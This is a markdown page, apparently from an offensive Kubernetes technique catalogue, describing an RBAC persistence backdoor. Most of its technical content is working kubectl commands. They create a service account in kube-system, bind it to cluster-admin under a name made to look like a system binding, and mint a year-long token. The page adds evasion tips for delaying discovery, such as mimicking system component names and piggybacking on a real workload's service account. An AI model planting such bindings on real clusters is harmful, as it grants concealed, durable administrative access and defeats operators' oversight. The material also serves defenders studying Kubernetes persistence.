---
title: "RBAC backdoor: a durable identity through bindings"
order: 4
description: "An attacker with rights over RBAC creates a binding that grants a controlled service account or user broad, lasting access. Unlike a stolen token, a ClusterRoleBinding persists until someone notices and removes it, survives credential rotation, and can be hidden among legitimate bindings or attached to an innocuous-looking service account."
keywords:
  - rbac backdoor
  - clusterrolebinding
  - service account
  - persistence
  - cluster-admin
---

# RBAC backdoor

The most durable Kubernetes persistence is an RBAC grant to an identity the attacker controls. A token can be rotated and a pod deleted, but a ClusterRoleBinding that gives a service account `cluster-admin` stays in effect until an operator finds and deletes it, and it keeps working no matter how often the underlying token is reissued because the binding, not the token, carries the authority. The attacker creates a service account (or reuses an existing innocuous one) and binds it to a powerful role.

Requires rights to create bindings (or the `bind`/`escalate` verbs):

```bash
kubectl auth can-i create clusterrolebindings
```

## Plant the binding

```bash
# a service account that blends in, in a busy namespace
kubectl create serviceaccount monitoring -n kube-system 2>/dev/null
# bind it to cluster-admin
cat <<YAML | kubectl apply -f -
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata: { name: system:monitoring-metrics }   # a name that looks built-in
roleRef: { apiGroup: rbac.authorization.k8s.io, kind: ClusterRole, name: cluster-admin }
subjects:
- { kind: ServiceAccount, name: monitoring, namespace: kube-system }
YAML
# mint a token for it whenever needed
kubectl create token monitoring -n kube-system --duration=8760h
```

## Staying hidden

```bash
# name the binding and SA to resemble system components (system:*, *-metrics)
# prefer binding an EXISTING service account used by a real workload, so the
# subject looks legitimate and deleting it would break that workload
kubectl get clusterrolebindings | grep -iE 'admin|system'   # see what blends in
```

## Exploitation notes

- Binding to the pre-existing `cluster-admin` role is cleanest and needs only the ability to create a ClusterRoleBinding (plus `bind` if anti-escalation applies); see [Escalate and bind verbs](../rbac-privilege-escalation/escalate-and-bind-verbs.md).
- Naming the binding and service account to mimic system components (`system:...`, `...-metrics`, `...-controller`) delays discovery, as does attaching the grant to a service account a real workload already uses.
- A bound identity plus on-demand `kubectl create token` gives renewable access without storing a token anywhere; a client certificate from [CSR approval](../rbac-privilege-escalation/csr-approval.md) is an alternative that survives even binding deletion until CA rotation.

## References

- [Kubernetes: RBAC authorization](https://kubernetes.io/docs/reference/access-authn-authz/rbac/)
- [Microsoft: Kubernetes threat matrix (persistence)](https://www.microsoft.com/en-us/security/blog/2021/03/23/secure-containerized-environments-with-updated-threat-matrix-for-kubernetes/)
